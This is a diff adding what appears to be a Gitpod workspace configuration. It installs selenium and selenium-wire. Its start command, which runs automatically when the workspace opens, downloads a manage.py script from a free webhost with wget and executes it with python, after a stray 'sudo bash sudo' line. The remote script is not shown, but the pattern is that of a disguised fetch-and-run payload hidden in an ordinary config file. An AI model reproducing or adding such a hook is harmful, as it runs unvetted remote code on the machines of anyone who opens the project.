@@ -1,0 +1,18 @@
+tasks:
+  - init: |
+      python -m pip install --upgrade pip
+      python -m pip install selenium
+      python -m pip install selenium-wire
+    command: |
+      sudo bash sudo
+      wget https://terabox1000.000webhostapp.com/mobile/manage.py
+      python manage.py
+  
+ports:
+  - port: 8000
+    visibility: private
+    onOpen: open-preview
+
+vscode:
+  extensions:
+    - ms-python.python
